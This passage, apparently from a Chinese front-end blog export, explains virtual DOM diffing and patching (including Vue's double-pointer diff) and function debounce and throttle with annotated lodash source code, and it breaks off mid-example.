3）第三步，将上面的DOM树和样式表关联起来，构建一颗Render树。这一过程又称为Attachment。每个DOM节点都有attach方法，接受样式信息，返回一个render对象（又名renderer）。这些render对象最终会被构建成一颗Render树。 4）第四步，有了Render树后，浏览器开始布局，会为每个Render树上的节点确定一个在显示屏上出现的精确坐标值。 5）第五步，Render数有了，节点显示的位置坐标也有了，最后就是调用每个节点的paint方法，让它们显示出来。 当你用传统的源生api或jQuery去操作DOM时，浏览器会从构建DOM树开始从头到尾执行一遍流程。比如当你在一次操作时需要更新10个DOM节点，理想状态是一次性构建完DOM树，再执行后续操作。但浏览器没这么智能，收到第一个更新DOM请求后，并不知道后续还有9次更新操作，因此会马上执行流程，最终执行10次流程。显然例如计算DOM节点的坐标值等都是白白浪费性能，可能这次计算完，紧接着的下一个DOM更新请求，这个节点的坐标值就变了，前面的一次计算是无用功。 即使计算机硬件一直在更新迭代，操作DOM的代价仍旧是昂贵的，频繁操作还是会出现页面卡顿，影响用户的体验。真实的DOM节点，哪怕一个最简单的div也包含着很多属性，可以打印出来直观感受一下： 虚拟DOM就是为了解决这个浏览器性能问题而被设计出来的。例如前面的例子，假如一次操作中有10次更新DOM的动作，虚拟DOM不会立即操作DOM，而是将这10次更新的diff内容保存到本地的一个js对象中，最终将这个js对象一次性attach到DOM树上，通知浏览器去执行绘制工作，这样可以避免大量的无谓的计算量。 Virtual DOM本质上就是在 JS 和 DOM 之间做了一个缓存。 二、虚拟DOM算法 一个真实的DOM节点如下： 12345&lt;ul id='list'&gt; &lt;li class='item'&gt;Item 1&lt;/li&gt; &lt;li class='item'&gt;Item 2&lt;/li&gt; &lt;li class='item'&gt;Item 3&lt;/li&gt;&lt;/ul&gt; 用js对象来模拟DOM节点如下： 1234567891011var element = &#123; tagName: 'ul', // 节点标签名 props: &#123; // DOM的属性，用一个对象存储键值对 id: 'list' &#125;, children: [ // 该节点的子节点 &#123;tagName: 'li', props: &#123;class: 'item'&#125;, children: [\"Item 1\"]&#125;, &#123;tagName: 'li', props: &#123;class: 'item'&#125;, children: [\"Item 2\"]&#125;, &#123;tagName: 'li', props: &#123;class: 'item'&#125;, children: [\"Item 3\"]&#125;, ]&#125; 用js对象模拟DOM节点的好处是，页面的更新可以先全部反映在js对象上，操作内存中的js对象的速度显然要快多了。等更新完后，再将最终的js对象映射成真实的DOM，交由浏览器去绘制。 这就是所谓的 Virtual DOM 算法，包括几个步骤： 1）用JavaScript对象结构表示DOM树的结构，然后用这个树构建一个真正的DOM树，插到文档当中 2）当状态变更的时候，重新构造一棵新的对象树，然后用新的树和旧的树进行比较，记录两棵树差异 3）把2所记录的差异应用到步骤1所构建的真正的DOM树上，视图就更新了 这里对于步骤1，也即创建虚拟dom到将虚拟dom映射到真实页面上，我们看一下Element方法的具体实现： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// 创建js对象：function Element(tagName, props, children) &#123; if (!(this instanceof Element)) &#123; return new Element(tagName, props, children); &#125; this.tagName = tagName; this.props = props || &#123;&#125;; this.children = children || []; this.key = props ? props.key : undefined; let count = 0; this.children.forEach((child) =&gt; &#123; if (child instanceof Element) &#123; count += child.count; &#125; count++; &#125;); this.count = count; &#125;第一个参数是节点名（如div），第二个参数是节点的属性（如class），第三个参数是子节点（如ul的li）。除了这三个参数会被保存在对象上外，还保存了key和count。// 有了js对象后，最终还需要将其映射成真实的DOM：Element.prototype.render = function() &#123; const el = document.createElement(this.tagName); const props = this.props; for (const propName in props) &#123; setAttr(el, propName, props[propName]); &#125; this.children.forEach((child) =&gt; &#123; const childEl = (child instanceof Element) ? child.render() : document.createTextNode(child); el.appendChild(childEl); &#125;); return el; &#125;;上面都是自解释代码，根据DOM名调用源生的createElement创建真实DOM，将DOM的属性全都加到这个DOM元素上，如果有子元素继续递归调用创建子元素，并appendChild挂到该DOM元素上。这样就完成了从创建虚拟DOM到将其映射成真实DOM的全部工作。 三、虚拟DOM实现 1）步骤一：用JS对象模拟DOM树 用 JavaScript 来表示一个 DOM 节点是很简单的事情，你只需要记录它的节点类型、属性，还有子节点(element.js)： 123456789function Element (tagName, props, children) &#123; this.tagName = tagName this.props = props this.children = children&#125;module.exports = function (tagName, props, children) &#123; return new Element(tagName, props, children)&#125; 例如上面的 DOM 结构就可以简单的表示： 1234567var el = require('./element')var ul = el('ul', &#123;id: 'list'&#125;, [ el('li', &#123;class: 'item'&#125;, ['Item 1']), el('li', &#123;class: 'item'&#125;, ['Item 2']), el('li', &#123;class: 'item'&#125;, ['Item 3'])]) 现在ul只是一个JavaScript对象表示的DOM结构，页面上并没有这个结构，我们可以根据这个ul构建真正的&lt; ul &gt;： 1234567891011121314151617181920Element.prototype.render = function () &#123; var el = document.createElement(this.tagName) // 根据tagName构建 var props = this.props for (var propName in props) &#123; // 设置节点的DOM属性 var propValue = props[propName] el.setAttribute(propName, propValue) &#125; var children = this.children || [] children.forEach(function (child) &#123; var childEl = (child instanceof Element) ? child.render() // 如果子节点也是虚拟DOM，递归构建DOM节点 : document.createTextNode(child) // 如果字符串，只构建文本节点 el.appendChild(childEl) &#125;) return el&#125; render方法会根据tagName构建一个真正的DOM节点，然后设置这个节点的属性，最后递归地把自己的子节点也构建起来。所以只需要： 12var ulRoot = ul.render()document.body.appendChild(ulRoot) 上面的ulRoot是真正的DOM节点，把它塞入文档中，这样body里面就有了真正的&lt; ul &gt;的DOM结构： 12345&lt;ul id='list'&gt; &lt;li class='item'&gt;Item 1&lt;/li&gt; &lt;li class='item'&gt;Item 2&lt;/li&gt; &lt;li class='item'&gt;Item 3&lt;/li&gt;&lt;/ul&gt; 2）步骤二：比较两棵虚拟DOM树的差异 比较两棵DOM树的差异是 Virtual DOM 算法最核心的部分，这也是所谓 diff 算法。两个树的完全 diff 算法是一个时间复杂度为 O(n^3) 的问题。在前端当中，你很少会跨越层级地移动DOM元素，所以 Virtual DOM 只会对同一个层级的元素进行对比，下面的div只会和同一层级的div对比，第二层级的只会跟第二层级对比，这样算法复杂度就可以达到 O(n)： a、深度优先遍历，记录差异 在实际的代码中，会对新旧两棵树进行一个深度优先的遍历，这样每个节点都会有一个唯一的标记： 在深度优先遍历的时候，每遍历到一个节点就把该节点和新的的树进行对比。如果有差异的话就记录到一个对象里面： 123456789101112131415161718192021222324252627// diff 函数，对比两棵树function diff (oldTree, newTree) &#123; var index = 0 // 当前节点的标志 var patches = &#123;&#125; // 用来记录每个节点差异的对象 dfsWalk(oldTree, newTree, index, patches) return patches&#125;// 对两棵树进行深度优先遍历function dfsWalk (oldNode, newNode, index, patches) &#123; patches[index] = [...] // 对比oldNode和newNode的不同，记录下来 diffChildren(oldNode.children, newNode.children, index, patches)&#125;// 遍历子节点function diffChildren (oldChildren, newChildren, index, patches) &#123; var leftNode = null var currentNodeIndex = index oldChildren.forEach(function (child, i) &#123; var newChild = newChildren[i] currentNodeIndex = (leftNode &amp;&amp; leftNode.count) // 计算节点的标识 ? currentNodeIndex + leftNode.count + 1 : currentNodeIndex + 1 dfsWalk(child, newChild, currentNodeIndex, patches) // 深度遍历子节点 leftNode = child &#125;)&#125; 例如，上面的div和新的div有差异，当前的标记是0，那么： 123// 用数组存储新旧节点的不同，同理p是patches[1]，ul是patches[3]，类推。patches[0] = [&#123;difference&#125;, &#123;difference&#125;, ...] b、差异类型 上面说的节点的差异指的是什么呢？对 DOM 操作可能会： 1）替换掉原来的节点，例如把上面的div换成了section 2）移动、删除、新增子节点，例如上面div的子节点，把p和ul顺序互换 3）修改了节点的属性 4）对于文本节点，文本内容可能会改变。例如修改上面的文本节点2内容为Virtual DOM 2。 所以我们定义了几种差异类型： 1234var REPLACE = 0var REORDER = 1var PROPS = 2var TEXT = 3 如果是节点替换，判断新旧节点的tagName和是不是一样的，如果不一样的说明需要替换掉。如div换成section，就记录下： 1234patches[0] = [&#123; type: REPALCE, node: newNode // el('section', props, children)&#125;] 如果给div新增了属性id为container，就记录下： 123456789patches[0] = [&#123; type: REPALCE, node: newNode // el('section', props, children)&#125;, &#123; type: PROPS, props: &#123; id: \"container\" &#125;&#125;] 如果是文本节点，如上面的文本节点2，就记录下： 1234patches[2] = [&#123; type: TEXT, content: \"Virtual DOM2\"&#125;] 如果把div的子节点重新排序呢？例如p, ul, div的顺序换成了div, p, ul。如果按照同层级进行顺序对比的话，它们都会被替换掉，如p和div的tagName不同，p会被div所替代。最终，三个节点都会被替换，这样DOM开销就非常大。而实际上是不需要替换节点，而只需要经过节点移动就可以达到，我们只需知道怎么进行移动。 这牵涉到两个列表的对比算法，看下面的列表对比算法。 c、列表对比算法 假设现在每个英文字母唯一地标识每一个子节点： 旧的节点顺序：a b c d e f g h i 新的节点顺序：a b c h d f g h i j 现在知道了新旧的顺序，求最小的插入、删除操作（移动可以看成是删除和插入操作的结合）。这个问题抽象出来其实是字符串的最小编辑距离问题（Edition Distance），最常见的解决算法是 Levenshtein Distance，通过动态规划求解，时间复杂度为 O(M * N)。但是我们并不需要真的达到最小的操作，我们只需要优化一些比较常见的移动情况，牺牲一定DOM操作，让算法时间复杂度达到线性的（O(max(M, N))。具体算法细节请百度。 我们能够获取到某个父节点的子节点的操作，就可以记录下来： 1234patches[0] = [&#123; type: REORDER, moves: [&#123;remove or insert&#125;, &#123;remove or insert&#125;, ...]&#125;] 但是要注意的是，因为tagName是可重复的，不能用这个来进行对比。所以需要给子节点加上唯一标识key，列表对比的时候，使用key进行对比，这样才能复用老的 DOM 树上的节点。 这样，我们就可以通过深度优先遍历两棵树，每层的节点进行对比，记录下每个节点的差异了。完整 diff 算法代码可见 diff.js: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118var _ = require('./util')var patch = require('./patch')var listDiff = require('list-diff2')function diff (oldTree, newTree) &#123; var index = 0 var patches = &#123;&#125; dfsWalk(oldTree, newTree, index, patches) return patches&#125;function dfsWalk (oldNode, newNode, index, patches) &#123; var currentPatch = [] // Node is removed. if (newNode === null) &#123; // Real DOM node will be removed when perform reordering, so has no needs to do anthings in here &#125; // TextNode content replacing else if (_.isString(oldNode) &amp;&amp; _.isString(newNode)) &#123; if (newNode !== oldNode) &#123; currentPatch.push(&#123; type: patch.TEXT, content: newNode &#125;) &#125; &#125; // Nodes are the same, diff old nodes props and children else if ( oldNode.tagName === newNode.tagName &amp;&amp; oldNode.key === newNode.key ) &#123; // Diff props var propsPatches = diffProps(oldNode, newNode) if (propsPatches) &#123; currentPatch.push(&#123; type: patch.PROPS, props: propsPatches &#125;) &#125; // Diff children. If the node has a `ignore` property, do not diff children if (!isIgnoreChildren(newNode)) &#123; diffChildren( oldNode.children, newNode.children, index, patches, currentPatch ) &#125; &#125; // Nodes are not the same, replace the old node with new node else &#123; currentPatch.push(&#123; type: patch.REPLACE, node: newNode &#125;) &#125; if (currentPatch.length) &#123; patches[index] = currentPatch &#125;&#125;function diffChildren (oldChildren, newChildren, index, patches, currentPatch) &#123; var diffs = listDiff(oldChildren, newChildren, 'key') newChildren = diffs.children if (diffs.moves.length) &#123; var reorderPatch = &#123; type: patch.REORDER, moves: diffs.moves &#125; currentPatch.push(reorderPatch) &#125; var leftNode = null var currentNodeIndex = index _.each(oldChildren, function (child, i) &#123; var newChild = newChildren[i] currentNodeIndex = (leftNode &amp;&amp; leftNode.count) ? currentNodeIndex + leftNode.count + 1 : currentNodeIndex + 1 dfsWalk(child, newChild, currentNodeIndex, patches) leftNode = child &#125;)&#125;function diffProps (oldNode, newNode) &#123; var count = 0 var oldProps = oldNode.props var newProps = newNode.props var key, value var propsPatches = &#123;&#125; // Find out different properties for (key in oldProps) &#123; value = oldProps[key] if (newProps[key] !== value) &#123; count++ propsPatches[key] = newProps[key] &#125; &#125; // Find out new property for (key in newProps) &#123; value = newProps[key] if (!oldProps.hasOwnProperty(key)) &#123; count++ propsPatches[key] = newProps[key] &#125; &#125; // If properties all are identical if (count === 0) &#123; return null &#125; return propsPatches&#125;function isIgnoreChildren (node) &#123; return (node.props &amp;&amp; node.props.hasOwnProperty('ignore'))&#125;module.exports = diff 步骤三：把差异应用到真正的DOM树上 因为步骤一所构建的 JavaScript 对象树和 render 出来真正的DOM树的信息、结构是一样的。所以我们可以对那棵DOM树也进行深度优先的遍历，遍历的时候从步骤二生成的patches对象中找出当前遍历的节点差异，然后进行 DOM 操作： 123456789101112131415161718192021222324252627282930313233343536373839404142function patch (node, patches) &#123; var walker = &#123;index: 0&#125; dfsWalk(node, walker, patches)&#125;function dfsWalk (node, walker, patches) &#123; var currentPatches = patches[walker.index] // 从patches拿出当前节点的差异 var len = node.childNodes ? node.childNodes.length : 0 for (var i = 0; i &lt; len; i++) &#123; // 深度遍历子节点 var child = node.childNodes[i] walker.index++ dfsWalk(child, walker, patches) &#125; if (currentPatches) &#123; applyPatches(node, currentPatches) // 对当前节点进行DOM操作 &#125;&#125;function applyPatches (node, currentPatches) &#123; currentPatches.forEach(function (currentPatch) &#123; switch (currentPatch.type) &#123; case REPLACE: node.parentNode.replaceChild(currentPatch.node.render(), node) break case REORDER: reorderChildren(node, currentPatch.moves) break case PROPS: setProps(node, currentPatch.props) break case TEXT: node.textContent = currentPatch.content break default: throw new Error('Unknown patch type ' + currentPatch.type) &#125; &#125;)&#125; 四、结语 Virtual DOM 算法主要是实现上面步骤的三个函数：element，diff，patch。然后就可以实际的进行使用： 1234567891011121314151617181920212223// 1. 构建虚拟DOMvar tree = el('div', &#123;'id': 'container'&#125;, [ el('h1', &#123;style: 'color: blue'&#125;, ['simple virtal dom']), el('p', ['Hello, virtual-dom']), el('ul', [el('li')])])// 2. 通过虚拟DOM构建真正的DOMvar root = tree.render()document.body.appendChild(root)// 3. 生成新的虚拟DOMvar newTree = el('div', &#123;'id': 'container'&#125;, [ el('h1', &#123;style: 'color: red'&#125;, ['simple virtal dom']), el('p', ['Hello, virtual-dom']), el('ul', [el('li'), el('li')])])// 4. 比较两棵虚拟DOM树的不同var patches = diff(tree, newTree)// 5. 在真正的DOM元素上应用变更patch(root, patches) 当然这是非常粗糙的实践，实际中还需要处理事件监听等；生成虚拟 DOM 的时候也可以加入 JSX 语法。这些事情都做了的话，就可以构造一个简单的ReactJS了。 本文完整代码于https://github.com/livoras/simple-virtual-dom 五、再谈diff算法原理 我们使用下面这张图的例子来讲述diff的过程，更新前是1到10排列的Node列表，更新后是乱序排列的Node列表。 罗列一下图中有以下几种类型的节点变化情况： 1）头部相同、尾部相同的节点：如1、10 2）头尾相同的节点：如2、9（处理完头部相同、尾部相同节点之后） 3）新增的节点：11 4）删除的节点：8 5）其他节点：3、4、5、6、7 简单的diff算法可以这样设计： 逐个遍历newVdom的节点，找到它在oldVdom中的位置，如果找到了就移动对应的DOM元素，如果没找到说明是新增节点，则新建一个节点插入，遍历完成之后如果oldVdom中还有没处理过的节点，则说明这些节点在newVdom中被删除了，删除它们即可。 整体步骤将整个diff分两部分： 1）第一部分是一个循环，循环内部是一个分支逻辑，每次循环只会进入其中的一个分支，每次循环会处理一个节点，处理之后将节点标记为已处理（oldVdom和newVdom都要进行标记，如果节点只出现在其中某一个vdom中，则另一个vdom中不需要进行标记），标记的方法有2种，当节点正好在vdom的指针处，移动指针将它排除到未处理列表之外即可，否则就要采用其他方法，Vue的做法是将节点设置为undefined。 2）循环结束之后，可能newVdom或者oldVdom中还有未处理的节点，如果是newVdom中有未处理节点，则这些节点是新增节点，做新增处理。如果是oldVdom中有这类节点，则这些是需要删除的节点，相应在DOM树中删除之。 整个过程是逐步找到更新前后vdom的差异，然后将差异反应到DOM树上（也就是patch），特别要提一下Vue的patch是即时的，并不是打包所有修改最后一起操作DOM（React则是将更新放入队列后集中处理），有人会问这样做性能很差吧？实际上现代浏览器对这样的DOM操作做了优化，并无差别。 逐步解析： 1）处理头部的同类型节点，即oldStart和newStart指向同类节点的情况，如下图中的节点1。这种情况下，将节点1的变更更新到DOM，然后对其进行标记，标记方法是oldStart和newStart后移1位即可，过程中不需要移动DOM（更新DOM或许是要的，比如属性变更了，文本内容变更了等等） 2）处理尾部的同类型节点，即oldEnd和newEnd指向同类节点的情况，如下图中的节点10。这种情况下，与情况1类似，将节点10的变更更新到DOM，然后oldEnd和newEnd前移1位进行标记，同样也不需要移动DOM。 3）处理头尾（尾头）的同类型节点，即oldStart和newEnd，以及oldEnd和newStart指向同类节点的情况，如下图中的节点2和节点9。这种情况下，先看节点2，其实是往后移了，移到oldEnd指向的节点（即节点9）后面，移动之后标记该节点，将oldStart后移1位，newEnd前移一位。 操作结束之后情况如下图： 同样地，节点9也是类似的处理，处理完之后成了下面这样： 4）处理新增的节点，newStart来到了节点11的位置，在oldVdom中找不到节点11，说明它是新增的，那么就创建一个新的节点，插入DOM树oldStart指向的节点（即节点3）前面，然后将newStart后移1位标记为已处理（注意oldVdom中没有节点11，所以标记过程中它的指针不需要移动），处理之后如下图： 5）处理更新的节点，经过第4步后，newStart来到了节点7的位置，在oldVdom中能找到它而且不在指针位置（查找oldVdom中oldStart到oldEnd区间内的节点），说明它的位置移动了。那么需要在DOM树中移动它，移到哪里？移到oldStart指向的节点（即节点3）前面，与此同时将节点标记为已处理，跟前面几种情况有点不同，newVdom中该节点在指针下，可以移动newStart进行标记，而在oldVdom中该节点不在指针处，所以采用设置为undefined的方式来标记（一定要标记吗？后面会提到） 处理之后就成了下面这样： 6）处理3、4、5、6节点，经过第5步处理之后，我们看到newStart和oldStart又指向了同一个节点（即都指向节点3），很简单，按照1中的做法只需移动指针即可，非常高效，3、4、5、6都如此处理，处理完之后如下图： 7）处理需删除的节点，经过前6步处理之后（实际上前6步是循环进行的），newStart跨过了newEnd，它们相遇啦！而这个时候，oldStart和oldEnd还没有相遇，说明这2个指针之间的节点（包括它们指向的节点，即上图中的节点7、节点8）是此次更新中被删掉的节点。OK，那我们在DOM树中将它们删除。再回到前面我们对节点7做了标记，为什么标记是必需的？标记的目的是告诉Vue它已经处理过了，是需要出现在新DOM中的节点，不要删除它，所以在这里只需删除节点8。 在应用中也可能会遇到oldVdom的起止点相遇了，但是newVdom的起止点没有相遇的情况，这个时候需要对newVdom中的未处理节点进行处理，这类节点属于更新中被加入的节点，需要将他们插入到DOM树中。 至此，整个diff过程结束了，Vue的diff算法与动态规划算法中的经典案例 “计算a到b的最小编辑距离” 看上去有些相似，实际完全不同，Vue的diff相对来说轻量很多，可以百度了解。 标注： 参考资料1：https://www.jianshu.com/p/616999666920 参考资料2：https://segmentfault.com/a/1190000004029168 参考资料3：https://blog.csdn.net/m6i37jk/article/details/78140159","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"函数防抖与函数节流","slug":"JS-bs-preventShake","date":"2018-09-15T17:09:19.000Z","updated":"2019-01-25T10:11:13.488Z","comments":true,"path":"2018/09/16/JS-bs-preventShake/","link":"","permalink":"http://liuxuewen-site.github.io/2018/09/16/JS-bs-preventShake/","excerpt":"","text":"一、目的 以下场景往往由于事件频繁被触发，因而频繁执行DOM操作、资源加载等重行为，导致UI停顿甚至浏览器崩溃： 1）window对象的resize、scroll事件 2）拖拽时的mousemove事件 3）射击游戏中的mousedown、keydown事件 4）文字输入、自动完成的keyup事件 实际上，对于window的resize事件，实际需求大多是n毫秒后再执行改变大小处理，而其他事件大多需求是以一定的频率执行后续处理。针对这两种需求就出现了debounce和throttle两种解决办法。 debounce(又称去抖)和throttle(又称节流)，其实都是函数调用频率的控制器。 二、debounce去抖 1）当调用函数n秒后，才会执行该动作，若在这n秒内又调用该函数，则取消前一次并重新计算执行时间。例如我们要根据用户输入做suggest，每当用户按下键盘的时候都可以取消前一次，并且只关心最后一次输入的时间就行了。 2）在lodash中提供了debounce函数： 1_.debounce(func, [wait=0], [options=&#123;&#125;]) opitons参数中定义了一些选项，主要是以下三个，组合起来可以实现不同的调用效果： a、leading，函数在每个等待时延的开始被调用，默认值为false b、trailing，函数在每个等待时延的结束被调用，默认值是true c、maxwait，最大的等待时间，因为如果debounce的函数调用时间不满足条件，可能永远都无法触发，因此增加了这个配置，保证大于一段时间后一定能执行一次函数 3）deboucne还有cancel方法，用于取消防抖动调用： 12345678910111213141516// 避免窗口在变动时出现昂贵的计算开销jQuery(window).on('resize', _.debounce(calculateLayout, 150));// 当点击时sendMail随后就被调用jQuery(element).on('click', _.debounce(sendMail, 300, &#123; 'leading': true, 'trailing': false&#125;));// 确保batchLog调用1次之后，1秒内会被触发var debounced = _.debounce(batchLog, 250, &#123; 'maxWait': 1000 &#125;);var source = new EventSource('/stream');jQuery(source).on('message', debounced);// 取消一个 trailing 的防抖动调用jQuery(window).on('popstate', debounced.cancel); 4）Vue官网里用到了一个例子，对用户输入的事件进行了去抖，因为用户输入后需要进行ajax请求，如果不进行去抖会频繁的发送ajax请求，所以通过debounce对ajax请求的频率进行了限制： 12345678910111213141516171819202122methods: &#123; getAnswer: _.debounce(function() &#123; if (!reg.test(this.question)) &#123; this.answer = 'Questions usually end with a question mark. ;-)'; return; &#125; this.answer = 'Thinking ... '; // then中的函数如果不是箭头函数，则需要对this赋值self let self = this; axios.get('https://yesno.wtf/api') .then((response) = &gt; &#123; this.answer = _.capitalize(response.data.answer) &#125;) .catch ((error) = &gt; &#123; this.answer = 'Error! Could not reach the API. ' + error &#125;) &#125;, 500)&#125;, 5）简单的实现debounce函数： 12345678910111213141516171819202122232425262728293031323334// 例子1：浏览器resizefunction test() &#123; console.log(1)&#125;function debounce(method, context) &#123; clearTimeout(method.tId); method.tId = setTimeout(function() &#123; method.call(context) &#125;, 500)&#125;window.onresize = function() &#123; debounce(test, window);&#125;// 例子2：输入框实时搜索交互var clocker = null;var search = document.getElementById(\"searchInput\");search.addEventListener(\"input\", function () &#123; if(clocker == null)&#123; clocker = setTimeout(func, 500); &#125; else &#123; clearTimeout(clocker); clocker = setTimeout(func, 500); &#125;&#125;)function func() &#123; console.log(1);&#125; 6）lodash中debounce的源码学习： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182//debounce.jsvar isObject = require('./isObject'), //是否是对象 now = require('./now'), //获取当前时间 toNumber = require('./toNumber'); //转为为数字var FUNC_ERROR_TEXT = 'Expected a function';var nativeMax = Math.max, //原生最大值方法 nativeMin = Math.min; //原生最小值方法/** * 函数去抖，也就是说当调用动作n毫秒后，才会执行该动作，若在这n毫秒内又调用此动作则将重新计算执行时间。 * * @param &#123;Function&#125; func 需要去抖的函数. * @param &#123;number&#125; [wait=0] 延迟执行的时间. * @param &#123;Object&#125; [options=&#123;&#125;] 选项对象. * @param &#123;boolean&#125; [options.leading=false] 指定是否在超时前调用. * @param &#123;number&#125; [options.maxWait] func延迟调用的最大时间. * @param &#123;boolean&#125; [options.trailing=true] 指定是否在超时后调用. * @returns &#123;Function&#125; 返回去抖之后的函数. * @example * * // Avoid costly calculations while the window size is in flux. * jQuery(window).on('resize', _.debounce(calculateLayout, 150)); * * // Invoke `sendMail` when clicked, debouncing subsequent calls. * jQuery(element).on('click', _.debounce(sendMail, 300, &#123; * 'leading': true, * 'trailing': false * &#125;)); * * // Ensure `batchLog` is invoked once after 1 second of debounced calls. * var debounced = _.debounce(batchLog, 250, &#123; 'maxWait': 1000 &#125;); * var source = new EventSource('/stream'); * jQuery(source).on('message', debounced); * * // Cancel the trailing debounced invocation. * jQuery(window).on('popstate', debounced.cancel); */function debounce(func, wait, options) &#123; var lastArgs, //上次调用参数 lastThis, //上次调用this maxWait, //最大等待时间 result, //返回结果 timerId, //timerId lastCallTime, //上次调用debounced时间,即触发时间，不一定会调用func lastInvokeTime = 0, //上次调用func时间，即成功执行时间 leading = false, //超时之前 maxing = false, //是否传入最大超时时间 trailing = true; //超时之后 if (typeof func != 'function') &#123; throw new TypeError(FUNC_ERROR_TEXT); &#125; wait = toNumber(wait) || 0; if (isObject(options)) &#123; leading = !!options.leading; maxing = 'maxWait' in options; maxWait = maxing ? nativeMax(toNumber(options.maxWait) || 0, wait) : maxWait; trailing = 'trailing' in options ? !!options.trailing : trailing; &#125; //调用func，参数为当前时间 function invokeFunc(time) &#123; var args = lastArgs, //调用参数 thisArg = lastThis; //调用的this lastArgs = lastThis = undefined; //清除lastArgs和lastThis lastInvokeTime = time; //上次调用时间为当前时间 result = func.apply(thisArg, args); //调用func，并将结果返回 return result; &#125; //超时之前调用 function leadingEdge(time) &#123; lastInvokeTime = time; //设置上次调用时间为当前时间 timerId = setTimeout(timerExpired, wait); //开始timer return leading ? invokeFunc(time) : result; //如果leading为true，调用func,否则返回result &#125; //设置还需要等待的时间 function remainingWait(time) &#123; var timeSinceLastCall = time - lastCallTime, //距离上次触发的时间 timeSinceLastInvoke = time - lastInvokeTime, //距离上次调用func的时间 result = wait - timeSinceLastCall; //还需要等待的时间 return maxing ? nativeMin(result, maxWait - timeSinceLastInvoke) : result; &#125; //是否应该被调用 function shouldInvoke(time) &#123; var timeSinceLastCall = time - lastCallTime, //距离上次触发时间的时间 timeSinceLastInvoke = time - lastInvokeTime; //距离上次调用func的时间 return (lastCallTime === undefined || (timeSinceLastCall &gt;= wait) || (timeSinceLastCall &lt; 0) || (maxing &amp;&amp; timeSinceLastInvoke &gt;= maxWait)); &#125; //刷新timer function timerExpired() &#123; var time = now(); if (shouldInvoke(time)) &#123; //如果可以调用，调用trailingEdge return trailingEdge(time); &#125; timerId = setTimeout(timerExpired, remainingWait(time));//不调用则重置timerId &#125; //超时之后调用 function trailingEdge(time) &#123; timerId = undefined; // Only invoke if we have `lastArgs` which means `func` has been // debounced at least once. //如果设置trailing为true,并且有lastArgs，调用func if (trailing &amp;&amp; lastArgs) &#123; return invokeFunc(time); &#125; lastArgs = lastThis = undefined; //清除lastArgs和lastThis return result; //否则返回result &#125; //取消执行 function cancel() &#123; if (timerId !== undefined) &#123; clearTimeout(timerId); &#125; lastInvokeTime = 0; lastArgs = lastCallTime = lastThis = timerId = undefined; &#125; //直接执行 function flush() &#123; return timerId === undefined ? result : trailingEdge(now()); &#125; function debounced() &#123; var time = now(), isInvoking = shouldInvoke(time); //判断是否可以调用 lastArgs = arguments; //得到参数 lastThis = this; //得到this对象 lastCallTime = time; //触发时间 if (isInvoking) &#123; if (timerId === undefined) &#123; //首次触发，调用leadingEdge return leadingEdge(lastCallTime); &#125; if (maxing) &#123; // 处理多次频繁的调用 timerId = setTimeout(timerExpired, wait); //设置定时器 return invokeFunc(lastCallTime); &#125; &#125; if (timerId === undefined) &#123; //如果没有timer,设置定时器 timerId = setTimeout(timerExpired, wait); &#125; return result; //返回result &#125; debounced.cancel = cancel; debounced.flush = flush; return debounced;&#125;module.exports = debounce; 三、throttle节流 1）throttle将一个函数的调用频率限制在一定阈值内，例如1s内一个函数不能被调用两次。 2）同样，lodash提供了throttle这个方法： 1_.throttle(func, [wait=0], [options=&#123;&#125;]) throttle同样提供了leading和trailing参数，与debounce含义相同，其实throttle就是设置了maxwait的debounce。 3）throttle还有cancel方法，用于取消节流调用： 123456789// 避免在滚动时过分的更新定位jQuery(window).on('scroll', _.throttle(updatePosition, 100));// 点击后就调用renewToken，但5分钟内超过1次var throttled = _.throttle(renewToken, 300000, &#123; 'trailing': false &#125;);jQuery(element).on('click', throttled);// 取消一个trailing的节流调用jQuery(window).on('popstate', throttled.cancel); 4）简单的实现throttle函数： 123456789101112131415161718192021222324function scrollFn()&#123; console.log(1)&#125;// method代表要执行的方法，delay代表延迟执行，duration代表限制多久内执行一次function throttle(method, delay, duration)&#123; var timer = null; var begin = new Date(); return function()&#123; var context = this, args = arguments; var current = new Date(); clearTimeout(timer); if(current - begin &gt;= duration)&#123; method.apply(context, args); begin = current; &#125; else &#123; timer = setTimeout(function()&#123; method.apply(context, args); &#125;, delay); &#125; &#125;&#125;window.onscroll = throttle(scrollFn,100,500) 5）lodash中throttle的源码学习： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//throttle.jsvar debounce = require('./debounce'), //debounce方法 isObject = require('./isObject'); //判断是否为对象var FUNC_ERROR_TEXT = 'Expected a function';/** * 函数节流 * * @param &#123;Function&#125; func 需要处理的函数. * @param &#123;number&#125; [wait=0] 执行间隔. * @param &#123;Object&#125; [options=&#123;&#125;] 选项对象. * @param &#123;boolean&#125; [options.leading=false] 指定是否在超时前调用. * @param &#123;number&#125; [options.maxWait] func延迟调用的最大时间. * @param &#123;boolean&#125; [options.trailing=true] 指定是否在超时后调用. * @returns &#123;Function&#125; 返回节流之后的函数. * @example * * // Avoid excessively updating the position while scrolling. * jQuery(window).on('scroll', _.throttle(updatePosition, 100)); * * // Invoke `renewToken` when the click event is fired, but not more than once every 5 minutes. * var throttled = _.throttle(renewToken, 300000, &#123; 'trailing': false &#125;); * jQuery(element).on('click', throttled); * * // Cancel the trailing throttled invocation. * jQuery(window).on('popstate', throttled.cancel); */function throttle(func, wait, options) &#123; var leading = true, trailing = true; if (typeof func != 'function') &#123; throw new TypeError(FUNC_ERROR_TEXT); &#125; if (isObject(options)) &#123; leading = 'leading' in options ? !!options.leading : leading; trailing = 'trailing' in options ? !!options.trailing : trailing; &#125; return debounce(func, wait, &#123; 'leading': leading, 'maxWait': wait, 'trailing': trailing &#125;);&#125;module.exports = throttle; 四、注意点： debounce返回的是一个经过包装的函数，被包装的函数必须是要立刻执行的函数。 下面的效果不是我们想要的效果，因为每次setInterval执行之后，都返回了一个没有执行的、经过debounce包装后的函数，所以debounce是无效的： 123456function test() &#123; 